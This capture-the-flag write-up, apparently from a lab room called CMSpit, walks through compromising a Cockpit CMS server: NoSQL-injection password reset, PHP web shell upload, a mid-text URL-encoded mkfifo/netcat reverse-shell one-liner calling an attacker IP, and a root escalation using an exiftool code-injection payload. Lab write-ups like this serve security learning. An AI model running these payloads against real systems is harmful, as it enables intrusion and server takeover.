CMSpit

Target IP: 10.10.152.77

You've identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.Your mission is to exploit these vulnerabilities and compromise the web server.

Reconnaissance


There are two TCP ports open on the target machine: SSH and HTTP. I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP

The target machine is running Cockpit CMS. The webpage above is displayed for this web application.


Doing a source-code scanning shows the target is running the version 0.11.1. From previous knowledge, I know this application is vulnerable to NoSQL injection.


Using searchsploit, I made a copy of the exploit on my machine. Time to use this exploit against the target machine.

Exploitation


Using the exploit, I enumerated the application further. It turns out there are four users: admin, darkStar7471, skidy, ekoparty. I reset the password of the user admin to jnh)z'5B,~. This user should give me the privileges to take over the server.


Using the credential admin:jnh)z'5B,~, I gained access to the web application on the server. The webpage above is shown after logging in.


I also found the email of the different users of the web application, as shown above.


After browsing around the application for some time, I found assets can be included. I wonder if I can upload my shell here.



I created a simple PHP web shell called shell.php and uploaded it to the target machine. And I can now perform RCE using this web-shell! Time to leverage this to a full reverse shell connection now. In the picture above, I sent the commands whoami;ls;id and the target machine successfully executed it.


And now I have compromised the web server as I have a full reverse shell connection on my machine at port 80. I used nc mkfifo as the payload with the command rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%2080%20%3E%2Ftmp%2Ff. Now I have a foothold on the target machine.

Privilege Escalation


There is a user called stux. This user has a file called .dbshell that is readable by me. The content of this file is shown above. It contains the password p4ssw0rdhack3d!123.


Using the password p4ssw0rdhack3d!123, I successfully switched to this stux user. I successfully escalated my privileges horizontally from the user www-data to stux.


Looks like the binary /usr/local/bin/exiftool can be used as root without password.


Running the command exiftool -ver I found out the target is running 12.05 version. This application version is vulnerable to code injection, as shown above.


I found a working PoC at this site, which is shown above. I can insert my bash shell inside the payload above to spawn a root shell. I created the payload (metadata "\c${system('/bin/bash')};").


And compiling the exploit using the PoC above, I gained a root shell. The commands highlighted in yellow are the ones I used to create and run the payload. Now I have root access with full access on the target machine :)
